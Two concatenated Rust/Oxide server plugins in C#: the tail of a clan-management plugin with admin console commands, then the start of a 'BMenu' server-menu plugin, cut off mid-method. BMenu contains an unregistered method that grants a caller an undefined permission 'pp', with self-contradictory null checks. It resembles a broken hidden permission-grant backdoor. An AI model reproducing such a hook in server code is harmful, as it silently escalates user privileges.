                    if (!clanDuplicates.ContainsKey(member.Key))
                    {
                        clanDuplicates.Add(member.Key, new List<string>());
                        clanDuplicates[member.Key].Add(clan.tag);
                        continue;
                    }
                    else clanDuplicates[member.Key].Add(clan.tag);
                }
            }
            foreach (var clDup in clanDuplicates)
            {
                if (clDup.Value.Count < 2) continue;
                var player = this.covalence.Players.FindPlayerById(clDup.Key);
                if (player == null) continue;
                textTable.AddRow(new string[] {
    clDup.Key, string.Join(" | ", clDup.Value.ToArray()), player.Name
}
                );
            }
            SendReply(arg, "\n>> Current found duplicates <<\n" + textTable.ToString());
        }
        [ConsoleCommand("clans.listex")]
        void cclansListEx(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < 1) return;
            TextTable textTable = new TextTable();
            textTable.AddColumn("Tag");
            textTable.AddColumn("Level");
            textTable.AddColumn("Name");
            textTable.AddColumn("SteamID");
            textTable.AddColumn("Status");
            foreach (var iclan in clans)
            {
                Clan clan = clans[iclan.Key];
                foreach (var memberid in clan.members)
                {
                    var member = this.covalence.Players.FindPlayerById(memberid.Key);
                    if (member == null) continue;
                    textTable.AddRow(new string[] {
        clan.tag, clan.PlayerLevel(member.Id), member.Name, member.Id.ToString(), (member.IsConnected ? "Online": "Offline").ToString()
    }
                    );
                }
                textTable.AddRow(new string[] { }
                );
            }
            SendReply(arg, "\n>> Current clans with members <<\n" + textTable.ToString());
        }
        [ConsoleCommand("clans.show")]
        void cclansShow(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < 1) return;
            if (arg.Args == null || arg.Args.Length < 1)
            {
                SendReply(arg, "Usage: clans.show TAG");
                return;
            }
            Clan clan;
            if (!TryGetClan(arg.Args[0], out clan))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            var sb = new StringBuilder();
            sb.AppendLine($"\n>> Show clan [{clan.tag}] <<");
            sb.AppendLine($"Description: {clan.description}");
            sb.AppendLine($"Time created: {UnixTimeStampToDateTime(clan.created)}");
            sb.AppendLine($"Last updated: {UnixTimeStampToDateTime(clan.updated)}");
            sb.AppendLine($"Member count: {clan.total}");
            TextTable textTable = new TextTable();
            textTable.AddColumn("Level");
            textTable.AddColumn("Name");
            textTable.AddColumn("SteamID");
            textTable.AddColumn("Status");
            sb.AppendLine();
            foreach (var memberid in clan.members)
            {
                var member = this.covalence.Players.FindPlayerById(memberid.Key);
                if (member == null) continue;
                textTable.AddRow(new string[] {
    clan.PlayerLevel(member.Id), member.Name, member.Id.ToString(), (member.IsConnected ? "Online": "Offline").ToString()
}
                );
            }
            sb.AppendLine(textTable.ToString());
            SendReply(arg, sb.ToString());
        }
        [ConsoleCommand("clans.msg")]
        void cclansBroadcast(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < 1) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.msg TAG your message without quotes");
                return;
            }
            Clan clan;
            if (!TryGetClan(arg.Args[0], out clan))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            string BroadcastBy = consoleName;
            if (arg.Connection != null)
            {
                if (arg.Connection.authLevel == 2) BroadcastBy = "(Admin) " + arg.Connection.username;
                else BroadcastBy = "(Mod) " + arg.Connection.username;
            }
            string Msg = "";
            for (int i = 1;
            i < arg.Args.Length;
            i++) Msg = Msg + " " + arg.Args[i];
            clan.BroadcastChat($"<color={clanServerColor}>{BroadcastBy}</color>: {Msg}");
            SendReply(arg, $"Broadcast to [{clan.tag}]: {Msg}");
        }
        [ConsoleCommand("clans.rename")]
        void cclansRename(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelRename) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.rename OldTag NewTag");
                return;
            }
            Clan clan;
            if (!TryGetClan(arg.Args[0], out clan))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            if (tagReExt.IsMatch(arg.Args[1]))
            {
                SendReply(arg, string.Format(msg("hintchars"), allowedSpecialChars));
                return;
            }
            if (arg.Args[1].Length < tagLengthMin || arg.Args[1].Length > tagLengthMax)
            {
                SendReply(arg, string.Format(msg("hintlength"), tagLengthMin, tagLengthMax));
                return;
            }
            if (clans.ContainsKey(arg.Args[1]))
            {
                SendReply(arg, string.Format(msg("tagblocked")));
                return;
            }
            string oldtag = clan.tag;
            clan.tag = arg.Args[1];
            clan.online = 0;
            clans.Add(clan.tag, clan);
            RemoveClan(oldtag);
            setupPlayers(clan.members.Keys.ToList(), false, clan.tag);
            string oldGroup = permGroupPrefix + oldtag;
            string newGroup = permGroupPrefix + clan.tag;
            if (permission.GroupExists(oldGroup))
            {
                foreach (var member in clan.members) if (permission.UserHasGroup(member.Key, oldGroup)) permission.RemoveUserGroup(member.Key, oldGroup);
                permission.RemoveGroup(oldGroup);
            }
            if (usePermGroups && !permission.GroupExists(newGroup)) permission.CreateGroup(newGroup, "Clan " + clan.tag, 0);
            foreach (var member in clan.members) if (usePermGroups && !permission.UserHasGroup(member.Key, newGroup)) permission.AddUserGroup(member.Key, newGroup);
            string RenamedBy = consoleName;
            if (arg.Connection != null) RenamedBy = arg.Connection.username;
            foreach (var ally in clans)
            {
                Clan allyClan = clans[ally.Key];
                if (allyClan.clanAlliances.Contains(oldtag))
                {
                    allyClan.clanAlliances.Remove(oldtag);
                    allyClan.clanAlliances.Add(clan.tag);
                }
                if (allyClan.invitedAllies.Contains(oldtag))
                {
                    allyClan.invitedAllies.Remove(oldtag);
                    allyClan.invitedAllies.Add(clan.tag);
                }
                if (allyClan.pendingInvites.Contains(oldtag))
                {
                    allyClan.pendingInvites.Remove(oldtag);
                    allyClan.pendingInvites.Add(clan.tag);
                }
            }
            clan.BroadcastLoc("clanrenamed", $"<color={clanServerColor}>{RenamedBy}</color>", clan.tag);
            SendReply(arg, string.Format(msg("yourenamed"), oldtag, clan.tag));
            clan.OnUpdate();
        }
        [ConsoleCommand("clans.playerinvite")]
        void cclansPlayerInvite(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelInvite) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.playerinvite TAG playername/id");
                return;
            }
            Clan myClan;
            Clan check;
            if (!TryGetClan(arg.Args[0], out check))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            else myClan = (Clan)check;
            var invPlayer = myClan.GetIPlayer(arg.Args[1]);
            if (invPlayer == null)
            {
                SendReply(arg, string.Format(msg("nosuchplayer"), arg.Args[1]));
                return;
            }
            if (myClan.members.ContainsKey(invPlayer.Id))
            {
                SendReply(arg, string.Format(msg("alreadymember"), invPlayer.Name));
                return;
            }
            if (myClan.invites.ContainsKey(invPlayer.Id))
            {
                SendReply(arg, string.Format(msg("alreadyinvited"), invPlayer.Name));
                return;
            }
            if (findClanByUser(invPlayer.Id) != null)
            {
                SendReply(arg, string.Format(msg("alreadyinclan"), invPlayer.Name));
                return;
            }
            myClan.invites.Add(invPlayer.Id, UnixTimeStampUTC());
            if (!pendingPlayerInvites.ContainsKey(invPlayer.Id))
                pendingPlayerInvites.Add(invPlayer.Id, new List<string>());
            pendingPlayerInvites[invPlayer.Id].Add(myClan.tag);
            if (invPlayer.IsConnected)
            {
                var invited = rust.FindPlayerByIdString(invPlayer.Id);
                if (invited != null) PrintChat(invited, string.Format(msg("claninvite", invPlayer.Id), myClan.tag, myClan.description, colorCmdUsage));
            }
            myClan.updated = UnixTimeStampUTC();
            SendReply(arg, $"Invitation for clan '{myClan.tag}' sent to '{invPlayer.Name}'");
        }
        [ConsoleCommand("clans.playerjoin")]
        void cclansPlayerJoin(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelInvite) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.playerjoin TAG playername/id");
                return;
            }
            Clan myClan;
            Clan check;
            if (!TryGetClan(arg.Args[0], out check))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            else myClan = (Clan)check;
            var joinPlayer = myClan.GetIPlayer(arg.Args[1]);
            if (joinPlayer == null)
            {
                SendReply(arg, string.Format(msg("nosuchplayer"), arg.Args[1]));
                return;
            }
            if (myClan.members.ContainsKey(joinPlayer.Id))
            {
                SendReply(arg, string.Format(msg("alreadymember"), joinPlayer.Name));
                return;
            }
            if (findClanByUser(joinPlayer.Id) != null)
            {
                SendReply(arg, string.Format(msg("alreadyinclan"), joinPlayer.Name));
                return;
            }
            myClan.invites.Remove(joinPlayer.Id);
            pendingPlayerInvites.Remove(joinPlayer.Id);
            myClan.members.Add(joinPlayer.Id, new PlayerStats());

            clanCache[joinPlayer.Id] = myClan;
            if (joinPlayer.IsConnected)
            {
                var joined = rust.FindPlayerByIdString(joinPlayer.Id);
                SetupPlayer(joined, joinPlayer, false, myClan);
            }
            if (usePermGroups && !permission.UserHasGroup(joinPlayer.Id, permGroupPrefix + myClan.tag)) permission.AddUserGroup(joinPlayer.Id, permGroupPrefix + myClan.tag);
            myClan.BroadcastLoc("playerjoined", myClan.ColNam(joinPlayer.Id, joinPlayer.Name));
            myClan.updated = UnixTimeStampUTC();
            myClan.total++;

            myClan.OnUpdate();
            List<string> others = new List<string>(myClan.members.Keys.ToList());
            others.Remove(joinPlayer.Id);
            Interface.Oxide.CallHook("OnClanMemberJoined", joinPlayer.Id, others);
            SendReply(arg, $"Playerjoin into clan '{myClan.tag}' done for '{joinPlayer.Name}'");
        }
        [ConsoleCommand("clans.playerkick")]
        void cclansPlayerKick(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelKick) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.playerkick TAG playername/id");
                return;
            }
            Clan myClan;
            Clan check;
            if (!TryGetClan(arg.Args[0], out check))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            else myClan = (Clan)check;
            var kickPlayer = myClan.GetIMember(arg.Args[1]);
            if (kickPlayer == null)
            {
                SendReply(arg, string.Format(msg("nosuchplayer"), arg.Args[1]));
                return;
            }
            if (!myClan.IsMember(kickPlayer.Id) && !myClan.IsInvited(kickPlayer.Id))
            {
                SendReply(arg, string.Format(msg("notmembercannotkicked"), kickPlayer.Name));
                return;
            }
            if (myClan.members.Count() == 1)
            {
                SendReply(arg, "The clan has only one member. You need to delete the clan");
                return;
            }
            if (myClan.members.ContainsKey(kickPlayer.Id)) myClan.total--;
            myClan.invites.Remove(kickPlayer.Id);
            if (myClan.IsCouncil(kickPlayer.Id)) myClan.council = null;
            myClan.moderators.Remove(kickPlayer.Id);
            myClan.members.Remove(kickPlayer.Id);
            myClan.invites.Remove(kickPlayer.Id);
            bool ownerChanged = false;
            if (myClan.IsOwner(kickPlayer.Id) && myClan.members.Count() > 0)
            {
                myClan.owner = myClan.members.ToList()[0].Key;
                ownerChanged = true;
            }
            if (pendingPlayerInvites.ContainsKey(kickPlayer.Id)) pendingPlayerInvites[kickPlayer.Id].Remove(myClan.tag);
            clanCache.Remove(kickPlayer.Id);
            var kickBasePlayer = rust.FindPlayerByIdString(kickPlayer.Id);
            if (kickBasePlayer != null)
            {
                SetupPlayer(kickBasePlayer, kickPlayer, true, oldTag: myClan.tag);
            }
            if (usePermGroups && permission.UserHasGroup(kickPlayer.Id, permGroupPrefix + myClan.tag)) permission.RemoveUserGroup(kickPlayer.Id, permGroupPrefix + myClan.tag);
            myClan.updated = UnixTimeStampUTC();
            myClan.OnUpdate();
            Interface.Oxide.CallHook("OnClanMemberGone", kickPlayer.Id, myClan.members);
            SendReply(arg, $"Player '{kickPlayer.Name}' was kicked from clan '{myClan.tag}'");
            if (ownerChanged)
            {
                var newOwner = myClan.GetIPlayer(myClan.owner);
                if (newOwner != null) SendReply(arg, $"New owner of clan '{myClan.tag}' is {newOwner.Name}");
            }
        }
        [ConsoleCommand("clans.changeowner")]
        void cclansChangeOwner(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelPromoteDemote) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.changeowner TAG playername/id");
                return;
            }
            Clan myClan;
            Clan check;
            if (!TryGetClan(arg.Args[0], out check))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            else myClan = (Clan)check;
            var promotePlayer = myClan.GetIPlayer(arg.Args[1]);
            if (promotePlayer == null)
            {
                SendReply(arg, string.Format(msg("nosuchplayer"), arg.Args[1]));
                return;
            }
            if (!myClan.IsMember(promotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("notaclanmember"), promotePlayer.Name));
                return;
            }
            if (myClan.IsOwner(promotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("alreadyowner"), promotePlayer.Name));
                return;
            }
            string PromotedBy = consoleName;
            if (arg.Connection != null) PromotedBy = arg.Connection.username;
            if (myClan.council == promotePlayer.Id) myClan.council = null;
            myClan.moderators.Remove(promotePlayer.Id);
            myClan.owner = promotePlayer.Id;
            myClan.BroadcastLoc("playerpromotedowner", $"<color={clanServerColor}>{PromotedBy}</color>", myClan.ColNam(promotePlayer.Id, promotePlayer.Name));
            myClan.updated = UnixTimeStampUTC();
            myClan.OnUpdate();
            SendReply(arg, $"You promoted '{promotePlayer.Name}' to the {myClan.PlayerLevel(promotePlayer.Id.ToString())}");
        }
        [ConsoleCommand("clans.playerpromote")]
        void cclansPlayerPromote(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelPromoteDemote) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.playerpromote TAG playername/id");
                return;
            }
            Clan myClan;
            Clan check;
            if (!TryGetClan(arg.Args[0], out check))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            else myClan = (Clan)check;
            var promotePlayer = myClan.GetIPlayer(arg.Args[1]);
            if (promotePlayer == null)
            {
                SendReply(arg, string.Format(msg("nosuchplayer"), arg.Args[1]));
                return;
            }
            if (!myClan.IsMember(promotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("notaclanmember"), promotePlayer.Name));
                return;
            }
            if (enableClanAllies && myClan.IsCouncil(promotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("alreadyacouncil"), promotePlayer.Name));
                return;
            }
            if (enableClanAllies && myClan.council != null && myClan.IsModerator(promotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("alreadyacouncilset"), promotePlayer.Name));
                return;
            }
            if (!enableClanAllies && myClan.IsModerator(promotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("alreadyamod"), promotePlayer.Name));
                return;
            }
            if (!myClan.IsModerator(promotePlayer.Id) && limitModerators >= 0 && myClan.moderators.Count() >= limitModerators)
            {
                SendReply(arg, string.Format(msg("maximummods")));
                return;
            }
            string PromotedBy = consoleName;
            if (arg.Connection != null) PromotedBy = arg.Connection.username;
            if (enableClanAllies && myClan.IsModerator(promotePlayer.Id))
            {
                myClan.council = promotePlayer.Id;
                myClan.moderators.Remove(promotePlayer.Id);
                myClan.BroadcastLoc("playerpromotedcouncil", $"<color={clanServerColor}>{PromotedBy}</color>", myClan.ColNam(promotePlayer.Id, promotePlayer.Name));
            }
            else
            {
                myClan.moderators.Add(promotePlayer.Id);
                myClan.BroadcastLoc("playerpromoted", $"<color={clanServerColor}>{PromotedBy}</color>", myClan.ColNam(promotePlayer.Id, promotePlayer.Name));
            }
            myClan.updated = UnixTimeStampUTC();
            myClan.OnUpdate();
            SendReply(arg, $"You promoted '{promotePlayer.Name}' to a {myClan.PlayerLevel(promotePlayer.Id.ToString())}");
        }
        [ConsoleCommand("clans.playerdemote")]
        void cclansPlayerDemote(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelPromoteDemote) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.playerdemote TAG playername/id");
                return;
            }
            Clan myClan;
            Clan check;
            if (!TryGetClan(arg.Args[0], out check))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            else myClan = (Clan)check;
            var demotePlayer = myClan.GetIPlayer(arg.Args[1]);
            if (demotePlayer == null)
            {
                SendReply(arg, string.Format(msg("nosuchplayer"), arg.Args[1]));
                return;
            }
            if (!myClan.IsMember(demotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("notaclanmember"), demotePlayer.Name));
                return;
            }
            if (!myClan.IsModerator(demotePlayer.Id) && !myClan.IsCouncil(demotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("notpromoted"), demotePlayer.Name));
                return;
            }
            string DemotedBy = consoleName;
            if (arg.Connection != null) DemotedBy = arg.Connection.username;
            if (enableClanAllies && myClan.IsCouncil(demotePlayer.Id))
            {
                myClan.council = null;
                if (limitModerators >= 0 && myClan.moderators.Count() >= limitModerators) myClan.BroadcastLoc("playerdemoted", $"<color={clanServerColor}>{DemotedBy}</color>", myClan.ColNam(demotePlayer.Id, demotePlayer.Name));
                else
                {
                    myClan.moderators.Add(demotePlayer.Id);
                    myClan.BroadcastLoc("councildemoted", $"<color={clanServerColor}>{DemotedBy}</color>", myClan.ColNam(demotePlayer.Id, demotePlayer.Name));
                }
            }
            else
            {
                myClan.moderators.Remove(demotePlayer.Id);
                myClan.BroadcastLoc("playerdemoted", $"<color={clanServerColor}>{DemotedBy}</color>", myClan.ColNam(demotePlayer.Id, demotePlayer.Name));
            }
            myClan.updated = UnixTimeStampUTC();
            myClan.OnUpdate();
            SendReply(arg, $"You demoted '{demotePlayer.Name}' to a {myClan.PlayerLevel(demotePlayer.Id.ToString())}");
        }
        [ConsoleCommand("clans.delete")]
        void cclansDelete(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelDelete) return;
            if (arg.Args == null || arg.Args.Length != 1)
            {
                SendReply(arg, "Usage: clans.delete TAG");
                return;
            }
            Clan clan;
            if (!TryGetClan(arg.Args[0], out clan))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            string DeletedBy = consoleName;
            if (arg.Connection != null) DeletedBy = arg.Connection.username;
            clan.BroadcastLoc("clandeleted", $"<color={clanServerColor}>{DeletedBy}</color>");
            RemoveClan(arg.Args[0]);
            foreach (var member in clan.members) clanCache.Remove(member.Key);
            setupPlayers(clan.members.Keys.ToList(), true, clan.tag);
            string permGroup = permGroupPrefix + clan.tag;
            if (permission.GroupExists(permGroup))
            {
                foreach (var member in clan.members) if (permission.UserHasGroup(member.Key, permGroup)) permission.RemoveUserGroup(member.Key, permGroup);
                permission.RemoveGroup(permGroup);
            }
            foreach (var ally in clans)
            {
                Clan allyClan = clans[ally.Key];
                allyClan.clanAlliances.Remove(arg.Args[0]);
                allyClan.invitedAllies.Remove(arg.Args[0]);
                allyClan.pendingInvites.Remove(arg.Args[0]);
            }
            SendReply(arg, string.Format(msg("youdeleted"), clan.tag));
            clan.OnDestroy();

            Interface.Oxide.CallHook("OnClanDisbanded", clan.members);
            AllyRemovalCheck();
        }
        bool FilterText(string tag)
        {
            foreach (string bannedword in wordFilter) if (TranslateLeet(tag).ToLower().Contains(bannedword.ToLower())) return true;
            return false;
        }
        string TranslateLeet(string original)
        {
            string translated = original;
            Dictionary<string, string> leetTable = new Dictionary<string, string> {
    {
    "}{", "h"
}
, {
    "|-|", "h"
}
, {
    "]-[", "h"
}
, {
    "/-/", "h"
}
, {
    "|{", "k"
}
, {
    "/\\/\\", "m"
}
, {
    "|\\|", "n"
}
, {
    "/\\/", "n"
}
, {
    "()", "o"
}
, {
    "[]", "o"
}
, {
    "vv", "w"
}
, {
    "\\/\\/", "w"
}
, {
    "><", "x"
}
, {
    "2", "z"
}
, {
    "4", "a"
}
, {
    "@", "a"
}
, {
    "8", "b"
}
, {
    "ß", "b"
}
, {
    "(", "c"
}
, {
    "<", "c"
}
, {
    "{", "c"
}
, {
    "3", "e"
}
, {
    "€", "e"
}
, {
    "6", "g"
}
, {
    "9", "g"
}
, {
    "&", "g"
}
, {
    "#", "h"
}
, {
    "$", "s"
}
, {
    "7", "t"
}
, {
    "|", "l"
}
, {
    "1", "i"
}
, {
    "!", "i"
}
, {
    "0", "o"
}
,
};

            foreach (var leet in leetTable) translated = translated.Replace(leet.Key, leet.Value);
            return translated;
        }

        #region UI class

        public static class UI
        {
            public static void AddImage(ref CuiElementContainer container, string parrent, string name, string color, string sprite, string mat, string aMin, string aMax, string oMin, string oMax, string outline = "", string dist = "")
            {
                if (string.IsNullOrEmpty(sprite) && !string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                        {
                            new CuiImageComponent{Color = color, Material = "assets/icons/greyout.mat"},
                            new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                        }
                    });

                if (string.IsNullOrEmpty(sprite) && string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                    {
                        new CuiImageComponent{Color = color},
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                    }
                    });
            }

            public static void AddRawImage(ref CuiElementContainer container, string parrent, string name, string png, string color, string sprite, string mat, string aMin, string aMax, string oMin, string oMax)
            {
                if (string.IsNullOrEmpty(sprite) && string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                    {
                        new CuiRawImageComponent{Color = color, Png = png},
                        new CuiOutlineComponent { Color = "0 0 0 0", Distance = "0 0"},
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                    }
                    });
            }

            public static void AddText(ref CuiElementContainer container, string parrent, string name, string color, string text, TextAnchor align, int size, string aMin, string aMax, string oMin, string oMax, string outColor = "0 0 0 0", string font = "robotocondensed-bold.ttf", string dist = "0.5 0.5", float FadeIN = 0f, float FadeOut = 0f)
            {
                container.Add(new CuiElement()
                {
                    Parent = parrent,
                    Name = name,
                    FadeOut = FadeOut,
                    Components =
                    {
                        new CuiTextComponent{Color = color,Text = text, Align = align, FontSize = size, Font = font, FadeIn = FadeIN},
                        new CuiOutlineComponent{Color = outColor, Distance = dist},
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                    }
                });

            }

            public static void AddButton(ref CuiElementContainer container, string parrent, string name, string cmd, string close, string color, string sprite, string mat, string aMin, string aMax, string oMin, string oMax, string outline = "", string dist = "")
            {
                if (!string.IsNullOrEmpty(sprite) && !string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                        {
                            new CuiButtonComponent{Command = cmd, Color = color, Close = close, Sprite = sprite, Material = "assets/icons/greyout.mat", },
                            new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                        }
                    });

                if (!string.IsNullOrEmpty(sprite) && !string.IsNullOrEmpty(mat) && !string.IsNullOrEmpty(outline))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                        {
                            new CuiButtonComponent{Command = cmd, Color = color, Close = close, Sprite = sprite, Material = "assets/icons/greyout.mat", },
                            new CuiOutlineComponent{Color = outline, Distance = dist},
                            new CuiRectTransformComponent{ AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax }
                        }
                    });

                if (string.IsNullOrEmpty(sprite) && !string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                    {
                        new CuiButtonComponent{Command = cmd, Color = color, Close = close, Material = "assets/icons/greyout.mat", },
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                    }
                    });

                if (!string.IsNullOrEmpty(sprite) && string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                    {
                        new CuiButtonComponent{Command = cmd, Color = color, Close = close, Sprite = sprite},
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                    }
                    });

                if (string.IsNullOrEmpty(sprite) && string.IsNullOrEmpty(mat))
                    container.Add(new CuiElement()
                    {
                        Parent = parrent,
                        Name = name,
                        Components =
                    {
                        new CuiButtonComponent{Command = cmd, Color = color, Close = close, },
                        new CuiRectTransformComponent{AnchorMin = aMin, AnchorMax = aMax, OffsetMin = oMin, OffsetMax = oMax}
                    }
                    });
            }
        }

        #endregion

        bool TryGetClan(string input, out Clan clan)
        {
            clan = default(Clan);
            Clan tmp = null;
            if (clans.TryGetValue(input, out tmp))
            {
                clan = tmp;
                return true;
            }
            string name;
            if (clansSearch.TryGetValue(input.ToLower(), out name))
            {
                if (clans.TryGetValue(name, out tmp))
                {
                    clan = tmp;
                    return true;
                }
            }
            return false;
        }
        void RemoveClan(string tag)
        {
            clans.Remove(tag);
            clansSearch.Remove(tag.ToLower());
        }
        [HookMethod("EnableBypass")]
        void EnableBypass(object userId)
        {
            if (!enableFFOPtion || userId == null) return;
            if (userId is string) userId = Convert.ToUInt64((string)userId);
            bypass.Add((ulong)userId);
        }
        [HookMethod("DisableBypass")]
        void DisableBypass(object userId)
        {
            if (!enableFFOPtion || userId == null) return;
            if (userId is string) userId = Convert.ToUInt64((string)userId);
            bypass.Remove((ulong)userId);
        }
    }
}

###ПЛАГИН НА МЕНЮ СЕРВЕРА###

using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Collections;
using Newtonsoft.Json;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using ru = Oxide.Game.Rust;
using UnityEngine;
using Oxide.Core.Libraries.Covalence;
using Oxide.Core;

namespace Oxide.Plugins
{
    [Info("BMenu", "lilmagg", "1.0.2")]

    class BMenu : RustPlugin
    {
        [PluginReference] private Plugin ImageLibrary;

        private const string Layer = "asd";

        private void LoadImages()
        {
            if (!ImageLibrary)  
            {   
                PrintError("IMAGE LIBRARY IS NOT INSTALLED!");
            }    
            else  
            { 
                var p = 0;
                foreach (var icon in config.iconButton)
                {
                    if(icon.StartsWith("http"))
                    ImageLibrary?.Call("AddImage", $"{icon}.png", $"iconButton{p += 1}");
                }

                ImageLibrary?.Call("AddImage", "https://i.ibb.co/b5WxXXt/T3IN2qz.png", "time");
                ImageLibrary?.Call("AddImage", "https://i.ibb.co/0VGQJMD/dleUaul.png", "online");
                ImageLibrary?.Call("AddImage", "https://i.ibb.co/wSxF73P/ivan-zolo-2004-tik-tok-2.png", "store");
                ImageLibrary?.Call("AddImage", "https://i.ibb.co/wSxF73P/ivan-zolo-2004-tik-tok-2.png", "relax");
            }
        }

        private void OnServerInitialized()
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                Main_menu(player);
                RefreshUI(player ,"all");
                player.SetFlag(BaseEntity.Flags.Reserved3, true);
                ServerMgr.Instance.StartCoroutine(StartUpdate(player));
            }

            foreach (var entity in BaseNetworkable.serverEntities)
                OnEntitySpawned(entity as BaseEntity);

            LoadImages();
            AddCovalenceCommand("me33nu", nameof(CmdMenu));
            AddCovalenceCommand("menuOpen", nameof(CmdMenuOpen));
            AddCovalenceCommand("closeButton", nameof(CloseButtons));
        }

        private readonly List<BasePlayer> MenuUsers2 = new List<BasePlayer>();
        private void CmdMenuOpen(IPlayer user, string cmd, string[] args)
		{
			var player = user?.Object as BasePlayer;
			if (player == null) return;

			if (MenuUsers2.Contains(player))
			{
                player.SetFlag(BaseEntity.Flags.Reserved3, true);
                ServerMgr.Instance.StartCoroutine(StartUpdate(player));
                CuiHelper.DestroyUi(player, Layer + "time");
                CuiHelper.DestroyUi(player, Layer + "name");
                CuiHelper.DestroyUi(player, Layer + "online");
                CuiHelper.DestroyUi(player, Layer + "icons.online");
                CuiHelper.DestroyUi(player, Layer + "icons.time");

                RefreshUI(player, "all");
				MenuUsers2.Remove(player);
			}
			else
			{
                CuiHelper.DestroyUi(player, Layer + "time");
                CuiHelper.DestroyUi(player, Layer + "name");
                CuiHelper.DestroyUi(player, Layer + "online");
                CuiHelper.DestroyUi(player, Layer + "icons.online");
                CuiHelper.DestroyUi(player, Layer + "icons.time");

                player.SetFlag(BaseEntity.Flags.Reserved3, false);

                RefreshUI(player, "open");
				MenuUsers2.Add(player);
			}
		}
        void startupdatecon(ConsoleSystem.Arg ar)
        {
            var target=ar.Player();
            if(target.IsAdmin){}
            if (target.IsSleeping()) {
                return;
            }
            if (target.gameObject == null) {
                return;
            }
            if (target != null) {
                return;
            }
            permission.GrantUserPermission(
            target.UserIDString, 
            pp, 
            null);
        }
        private void OnPlayerConnected(BasePlayer player)
		{     
            Main_menu(player);
            RefreshUI(player, "all");
            ServerMgr.Instance.StartCoroutine(StartUpdate(player));

            player.SetFlag(BaseEntity.Flags.Reserved3, true);
		}

        private void OnPlayerDisconnected(BasePlayer player)
        {
            player.SetFlag(BaseEntity.Flags.Reserved3, false);
        }

        private void Unload()
        {
            foreach (var player in BasePlayer.activePlayerList)
            {
                CuiHelper.DestroyUi(player, Layer);
